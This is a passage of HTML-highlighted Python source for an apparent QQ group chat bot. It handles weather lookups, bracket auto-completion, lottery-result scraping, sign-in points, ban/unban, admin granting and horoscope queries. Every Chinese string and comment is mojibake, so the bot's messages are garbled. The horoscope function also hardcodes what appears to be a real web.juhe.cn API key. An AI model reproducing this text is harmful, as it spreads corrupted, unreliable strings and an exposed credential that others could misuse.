æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹\næ¥æ‰”ç“¶å­\næç“¶å­ï¼šå‘é€æç“¶å­æ¥æåˆ«äººæ‰”çš„ç“¶å­\nå¸®åŠ©ï¼šè¾“å…¥/helpï¼Œè·å–å¸®åŠ©"</span><span class="token keyword">def</span> <span class="token function">weather</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        city<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        city<span class="token operator">=</span><span class="token string">'å¾å·'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ercode<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"ç½—ä¼¯ç‰¹è¢«å­¦æ ¡å…³èµ·æ¥äº†å‘œå‘œ"</span>    <span class="token keyword">if</span> <span class="token string">"invilad-citykey"</span> <span class="token keyword">in</span> ercode<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æŠ±æ­‰ï¼Œæ‚¨çš„è¾“å…¥æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥åå†è¯•"</span>    weatherInfo<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'forecast'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ganmao<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ganmao'</span><span class="token punctuation">]</span>    fl<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'fengli'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    hi<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lo<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'low'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    weatherInfo<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"ä»Šæ—¥</span><span class="token interpolation"><span class="token punctuation">&#123;</span>city<span class="token punctuation">&#125;</span></span><span class="token string">å¤©æ°”</span><span class="token interpolation"><span class="token punctuation">&#123;</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ï¼Œæœ€é«˜æ¸©åº¦</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hi<span class="token punctuation">&#125;</span></span><span class="token string">â„ƒï¼Œæœ€ä½æ¸©åº¦</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">&#125;</span></span><span class="token string">â„ƒï¼Œ</span><span class="token interpolation"><span class="token punctuation">&#123;</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'fengxiang'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>fl<span class="token punctuation">&#125;</span></span><span class="token string">çº§\næ¸©é¦¨æç¤ºï¼Œ</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ganmao<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> weatherInfo<span class="token keyword">def</span> <span class="token function">buquan</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#è®¡ç®—æ‹¬å·æ•°é‡å¹¶è‡ªåŠ¨è¡¥å…¨</span>    <span class="token keyword">def</span> <span class="token function">countBracket</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>        countban<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'('</span><span class="token punctuation">:</span>                countban<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">')'</span><span class="token punctuation">:</span>                countban<span class="token operator">-=</span><span class="token number">1</span>        countquan<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'ï¼ˆ'</span><span class="token punctuation">:</span>                countquan<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'ï¼‰'</span><span class="token punctuation">:</span>                countquan<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'ban'</span><span class="token punctuation">:</span>countban<span class="token punctuation">,</span><span class="token string">'quan'</span><span class="token punctuation">:</span>countquan<span class="token punctuation">&#125;</span>    <span class="token comment">#è‡ªåŠ¨è¡¥å…¨æ‹¬å·</span>    ban<span class="token operator">=</span>countBracket<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span>    quan<span class="token operator">=</span>countBracket<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'quan'</span><span class="token punctuation">]</span>    bu<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>ban <span class="token keyword">or</span> quan<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> ban<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ban<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">')'</span>    <span class="token keyword">elif</span> ban<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span>ban<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'('</span>    <span class="token keyword">if</span> quan<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>quan<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'ï¼‰'</span>    <span class="token keyword">elif</span> quan<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span>quan<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'ï¼ˆ'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bu<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]å¸®ä½ è¡¥æ‹¬å·"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> bu<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]å¸®ä½ è¡¥æ‹¬å·"</span></span><span class="token keyword">def</span> <span class="token function">theDoubleChromosphere</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.cwl.gov.cn/fcpz/yxjs/ssq/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token comment">#è·å–çº¢çƒ</span>    red<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqRed-dom\">\[(.*?)\]&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    red<span class="token operator">=</span>red<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment">#è·å–è“çƒ</span>    blue<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqBlue-dom\">\[(.*?)\]&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    blue<span class="token operator">=</span>blue<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment">#è·å–æœŸå·</span>    qh<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqQh-dom\">(.*?)&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#è·å–å¥–æ± </span>    pool<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqPool-dom\">(.*?)&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ç¬¬</span><span class="token interpolation"><span class="token punctuation">&#123;</span>qh<span class="token punctuation">&#125;</span></span><span class="token string">æœŸå¼€å¥–ç»“æœä¸ºï¼š\nçº¢çƒï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>red<span class="token punctuation">&#125;</span></span><span class="token string">\nè“çƒï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blue<span class="token punctuation">&#125;</span></span><span class="token string">\nå¥–æ± ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pool<span class="token punctuation">&#125;</span></span><span class="token string">\n[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]å®³æç€ç­‰ç€å¹²å•¥å‘¢ï¼Œèµ¶ç´§ä¹°å½©ç¥¨å»å•Š"</span></span><span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>nick<span class="token punctuation">)</span><span class="token punctuation">:</span>    today<span class="token operator">=</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisGroupUserInfo<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> nick<span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> nick<span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>        thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'signTime'</span><span class="token punctuation">]</span><span class="token operator">==</span>today<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨ä»Šå¤©å·²ç»ç­¾åˆ°è¿‡äº†ï¼Œæ˜å¤©å†æ¥å§"</span></span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span>        thisUser<span class="token punctuation">[</span><span class="token string">'signTime'</span><span class="token punctuation">]</span><span class="token operator">=</span>today        group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]ç­¾åˆ°æˆåŠŸï¼Œæ‚¨çš„ç§¯åˆ†ä¸º</span><span class="token interpolation"><span class="token punctuation">&#123;</span>thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ï¼Œæ˜å¤©å†æ¥å§"</span></span><span class="token keyword">def</span> <span class="token function">getQQ</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        qq<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"qq=(\d+)"</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        qq<span class="token operator">=</span><span class="token boolean">None</span>    <span class="token keyword">return</span> qq<span class="token keyword">def</span> <span class="token function">ban</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"å¥½ï¼Œæˆ‘ä»¬ä¸å’Œ[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]ç©"</span></span><span class="token keyword">def</span> <span class="token function">unban</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"å¥½å§ï¼Œæˆ‘åŸè°…ä½ äº†[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token keyword">def</span> <span class="token function">keywordForPerson</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'å¤©æ°”'</span><span class="token punctuation">:</span>        person<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>weather<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">isBan</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">point</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨çš„ç§¯åˆ†ä¸º</span><span class="token interpolation"><span class="token punctuation">&#123;</span>thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]è¯·å…ˆç­¾åˆ°åé‡è¯•"</span></span><span class="token keyword">def</span> <span class="token function">isAdmin</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">giveAdmin</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> <span class="token string">"nick"</span><span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>    thisUser<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>    thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"æ²¡é—®é¢˜ï¼Œä»¥åæˆ‘å°±å¬ä½ çš„å•¦[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token keyword">def</span> <span class="token function">today</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        message<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        message<span class="token operator">=</span>message<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        message<span class="token operator">=</span><span class="token boolean">None</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"è¯·è¾“å…¥è¿åŠ¿ æ˜Ÿåº§æ¥æŸ¥è¯¢ä»Šæ—¥è¿åŠ¿"</span></span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        message<span class="token operator">=</span>message<span class="token operator">+</span><span class="token string">"åº§"</span>    url<span class="token operator">=</span><span class="token string">"http://web.juhe.cn:8080/constellation/getAll"</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"4a11bbcbf089edaf14c2d9bdb80c2ec4"</span><span class="token punctuation">,</span>        <span class="token string">"consName"</span><span class="token punctuation">:</span>message<span class="token punctuation">,</span>        <span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"today"</span>    <span class="token punctuation">&#125;</span>    ys<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ä»Šæ—¥è¿åŠ¿ï¼š\nç»¼åˆæŒ‡æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'all'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\nå¹¸è¿è‰²ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\nå¥åº·æŒ‡æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'health'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\nçˆ±æƒ…æŒ‡æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'love'</span><span class="token punctuation">]</span><span class="token 